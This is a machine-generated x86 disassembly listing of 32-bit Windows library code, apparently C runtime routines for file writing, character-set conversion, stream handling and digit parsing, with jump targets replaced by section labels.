push [ ebp - 0x1ae4 ]
inc ebx
inc [ ebp - 0x1abc ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1ac0 ]
push ebx
push eax
call sub_10018e92
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1ac0 ] eax
call sub_1001ab85
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
mov al [ ebp - 0x1ad9 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1abc ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1abc ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
cmp [ ebp - 0x1ac4 ] esi
mov [ ebp - 0x1ac8 ] eax
jl r-xdata
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_10018191
push 0x10
push r--data
call sub_10011ecc
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_1000e8ee
and [ eax ] 0x0
call sub_1000e8db
mov [ eax ] 0x9
call sub_1000e8ee
mov [ eax ] edi
call sub_1000e8db
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_1000e873
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_10011f11
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_1001aabe
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1000e8db
mov [ eax ] 0x9
call sub_1000e8ee
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10017a5e
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10018263
mov eax [ ebp - 0x1c ]
sub_1001826d
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_100119e5
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_100182b6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_1000e8db
mov [ eax ] 0x9
xor eax eax
pop ebp
retn
call sub_1000e8db
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_1000e873
add esp 0x14
xor eax eax
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
sub_1001831a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ eax + 0x10 ]
call sub_1000e8db
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
sub_1001834c
mov edi edi
push esi
push edi
xor edi edi
lea esi [ edi + rw-data ]
push [ esi ]
call sub_1000e03f
add edi 0x4
pop ecx
mov [ esi ] eax
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_10018383
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_1000afe5
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_1000e8db
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_1000e873
add esp 0x14
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_1000e8db
mov [ eax ] 0x2a
call sub_1000e8db
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_1000e8db
push 0x22
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_1000e873
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_1000b660
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_1000b660
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_1001850c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1000afe5
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10018560
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_100185f5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1000afe5
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_1001aede
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_10018646
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_100185f5
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_10018674
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1000afe5
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x80
lea eax [ ebp - 0x10 ]
push eax
push 0x80
push [ ebp + 0x8 ]
call sub_1001aede
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_100186ca
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_10018674
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x80
pop ebp
retn
sub_100186fa
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
test [ esi + 0xc ] 0x40
push edi
mov ebx rw-data
jne r-xdata
add [ esi + 0x4 ] 0xfffffffe
js r-xdata
push esi
call sub_1001831a
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_1001af96
mov ecx [ esi ]
movzx eax [ ecx ]
add ecx 0x2
mov [ esi ] ecx
jmp r-xdata
mov eax ebx
push esi
call sub_1001831a
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
test [ esi + 0xc ] 0x40
jne r-xdata
dec [ esi + 0x4 ]
js r-xdata
push esi
call sub_1001831a
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_1001831a
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
push esi
call sub_1001831a
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_1001b232
pop ecx
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
test [ eax + 0x24 ] 0x7f
je r-xdata
mov eax ebx
push esi
call sub_1001831a
pop ecx
cmp eax 0xfffffffe
je r-xdata
dec [ esi + 0x4 ]
mov [ ebp + 0x8 ] al
js r-xdata
mov eax 0xffff
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
xor edi edi
inc edi
dec [ esi + 0x4 ]
js r-xdata
push esi
call sub_1001831a
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_1001831a
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
push esi
call sub_1001b232
pop ecx
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
push esi
call sub_1001b232
pop ecx
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
test [ eax + 0x4 ] 0x80
je r-xdata
mov [ ebp + 0x9 ] al
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] al
movzx eax al
push eax
call sub_10018544
pop ecx
test eax eax
je r-xdata
cmp eax 0xffffffff
je r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp + 0x8 ]
push eax
call sub_10018e92
add esp 0xc
cmp eax 0xffffffff
jne r-xdata
dec [ esi + 0x4 ]
js r-xdata
mov ax [ ebp + 0x8 ]
jmp r-xdata
call sub_1000e8db
mov [ eax ] 0x2a
jmp r-xdata
push esi
call sub_1001b232
pop ecx
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
push 0x2
mov [ ebp - 0x3 ] al
pop edi
movsx eax [ ebp - 0x4 ]
push esi
push eax
call sub_1001b1c0
pop ecx
mov eax 0xffff
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
pop ecx
sub_100188a5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi 0xffff
mov eax edi
cmp bx ax
je r-xdata
mov eax edi
mov eax [ esi + 0xc ]
test al 0x1
jne r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
test al al
jns r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
push esi
call sub_1001826d
pop ecx
test al 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
add eax 0x2
cmp [ esi ] eax
jae r-xdata
push esi
call sub_1001831a
pop ecx
mov ebx rw-data
cmp eax 0xffffffff
je r-xdata
add [ esi ] 0xfffffffe
test [ esi + 0xc ] 0x40
mov eax [ esi ]
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
push esi
call sub_1001831a
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov [ eax ] bx
cmp [ eax ] bx
je r-xdata
cmp [ esi + 0x18 ] 0x2
jb r-xdata
mov ebx [ ebp + 0x8 ]
push esi
call sub_1001831a
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_1001831a
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_1001831a
and eax 0x1f
shl eax 0x6
add eax [ edi ]
pop ecx
pop ecx
mov edi 0xffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
mov eax [ esi + 0xc ]
add [ esi + 0x4 ] 0x2
and eax 0xffffffef
or eax 0x1
mov [ esi + 0xc ] eax
mov ax bx
jmp r-xdata
add eax 0x2
mov [ esi ] eax
mov [ esi ] eax
mov eax ebx
push esi
call sub_1001831a
pop ecx
cmp eax 0xfffffffe
je r-xdata
test [ eax + 0x4 ] 0x80
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_100184ef
add esp 0x10
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
push 0x2
pop eax
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] dh
mov [ ebp - 0x10 ] eax
jmp r-xdata
push esi
call sub_1001831a
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_1001831a
and eax 0x1f
shl eax 0x6
add eax [ edi ]
pop ecx
pop ecx
mov edi 0xffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
add ecx eax
cmp [ esi ] ecx
jae r-xdata
test [ eax + 0x24 ] 0x7f
je r-xdata
lea ecx [ eax - 0x1 ]
test ecx ecx
jl r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
add [ esi + 0x4 ] eax
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x1
mov [ esi + 0xc ] eax
mov ax dx
jmp r-xdata
dec [ esi ]
dec ecx
mov bl [ ebp + ecx - 0xb ]
mov eax [ esi ]
mov [ eax ] bl
jns r-xdata
cmp eax [ esi + 0x18 ]
jg r-xdata
mov eax [ ebp - 0x10 ]
mov [ esi ] ecx
sub_10018a5f
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
cmp esi ebx
je r-xdata
cmp edi ebx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x20 ]
call sub_1000afe5
cmp esi ebx
je r-xdata
call sub_1000e8db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov esi [ ebp - 0x20 ]
cmp [ esi + 0x14 ] ebx
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
lea ecx [ ebp - 0x10 ]
push ecx
push ebx
push ebx
push ebx
push 0xffffffff
push edi
push ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
push edi
call sub_1000b3ed
pop ecx
jmp r-xdata
cmp [ esi + 0xac ] 0x1
jne r-xdata
cmp [ ebp + 0x10 ] ebx
jbe r-xdata
call sub_1000e8db
mov [ eax ] 0x2a
cmp [ ebp - 0x14 ] bl
je r-xdata
cmp [ ebp - 0x10 ] ebx
jne r-xdata
cmp [ ebp - 0x14 ] bl
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push ebx
push [ ebp + 0x10 ]
push [ ebp - 0x28 ]
push 0xffffffff
push edi
push ebx
push [ esi + 0x4 ]
call [ WideCharToMultiByte@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx ebx
jbe r-xdata
cmp [ ebp - 0x14 ] bl
je r-xdata
mov eax 0xff
cmp [ edi ] ax
ja r-xdata
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
dec eax
jmp r-xdata
mov ecx [ ebp - 0x18 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x10 ] ebx
jne r-xdata
cmp [ ebp - 0x10 ] ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push ebx
push [ ebp + 0x10 ]
push [ ebp - 0x28 ]
push [ ebp + 0x10 ]
push edi
push ebx
push [ esi + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov eax edi
mov eax [ ebp - 0x24 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ edi ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x24 ]
mov [ edx + eax ] cl
mov cx [ edi ]
inc edi
inc edi
test cx cx
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
je r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
cmp [ ebp - 0x10 ] ebx
jne r-xdata
cmp ecx ebx
je r-xdata
inc eax
inc eax
dec ecx
jne r-xdata
inc eax
mov [ ebp - 0x24 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp edi [ ebp + 0x10 ]
jb r-xdata
mov ecx [ ebp - 0x28 ]
cmp [ ecx + eax - 0x1 ] bl
jne r-xdata
cmp [ eax ] bx
jne r-xdata
cmp [ eax ] bx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push ebx
push [ esi + 0xac ]
lea eax [ ebp - 0xc ]
push eax
push 0x1
push [ ebp - 0x2c ]
push ebx
push [ esi + 0x4 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x24 ] eax
cmp eax ebx
je r-xdata
cmp [ ebp - 0x14 ] bl
je r-xdata
jmp r-xdata
sub eax edi
sar eax 0x1
inc eax
mov [ ebp + 0x10 ] eax
cmp [ ebp - 0x10 ] ebx
jne r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
cmp eax ebx
jl r-xdata
cmp eax 0x5
ja r-xdata
lea ecx [ eax + edi ]
cmp ecx [ ebp + 0x10 ]
ja r-xdata
xor edx edx
cmp eax ebx
jle r-xdata
add [ ebp - 0x2c ] 0x2
mov cl [ ebp + edx - 0xc ]
mov eax [ ebp - 0x28 ]
mov [ eax + edi ] cl
cmp cl bl
je r-xdata
inc edx
inc edi
cmp edx [ ebp - 0x24 ]
jl r-xdata
sub_10018ca1
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ebx
cmp esi ebx
je r-xdata
cmp edi ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp esi ebx
je r-xdata
call sub_1000e8db
push 0x16
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
mov [ esi ] bl
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x18 ]
cmp eax edi
jbe r-xdata
mov [ eax ] ebx
cmp eax 0x7fffffff
ja r-xdata
mov eax edi
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push esi
call sub_10018a5f
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
inc eax
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
cmp eax edi
jbe r-xdata
call sub_1000e8db
mov eax [ eax ]
jmp r-xdata
mov [ esi ] bl
mov eax [ ebp - 0x4 ]
mov [ ecx ] eax
mov [ eax + esi - 0x1 ] bl
cmp [ ebp + 0x18 ] 0xffffffff
je r-xdata
mov eax edi
mov [ ebp - 0x4 ] 0x50
mov [ esi ] bl
cmp edi eax
ja r-xdata
call sub_1000e8db
push 0x22
jmp r-xdata
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_1000e873
add esp 0x14
mov eax esi
jmp r-xdata
sub_10018d5b
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10018ca1
add esp 0x18
pop ebp
retn
sub_10018d7b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_1000afe5
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_1001850c
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_1000e8db
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_10018eac
mov edi edi
push ebp
mov ebp esp
mov ax [ ebp + 0x8 ]
cmp ax 0x30
jae r-xdata
cmp ax 0x3a
jae r-xdata
mov eax 0xffffffff
pop ebp
retn
mov ecx 0xff10
mov edx ecx
cmp ax dx
jae r-xdata
movzx eax ax
sub eax 0x30
pop ebp
retn
mov edx 0xff1a
mov ecx 0x660
mov edx ecx
cmp ax dx
jb r-xdata
movzx eax ax
sub eax ecx
pop ebp
retn
or eax 0xffffffff
pop ebp
retn
add edx 0xa
cmp ax dx
jae r-xdata
mov ecx 0x6f0
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
mov ecx 0x966
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
mov ecx 0x9e6
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
mov ecx 0xa66
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
mov ecx 0xae6
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
mov ecx 0xb66
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
mov ecx 0xc66
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
mov ecx 0xce6
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
mov ecx 0xd66
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
mov ecx 0xe50
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
mov ecx 0xed0
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
add ecx 0x50
mov edx ecx
cmp ax dx
jb r-xdata
mov edx 0xf2a
cmp ax dx
jb r-xdata
mov ecx 0x1040
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
mov ecx 0x17e0
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
add ecx 0x30
mov edx ecx
cmp ax dx
jb r-xdata
mov edx 0x181a
jmp r-xdata
cmp ax dx
jb r-xdata
sub_10019087
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x40
push edi
jne r-xdata
add [ esi + 0x4 ] 0xfffffffe
js r-xdata
push esi
call sub_1001831a
pop ecx
mov ebx rw-data
cmp eax 0xffffffff
je r-xdata
movzx eax [ ebp + 0x8 ]
push esi
push eax
call sub_1001b35d
pop ecx
pop ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
add [ esi ] 0x2
jmp r-xdata
mov eax ebx
push esi
call sub_1001831a
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
leave
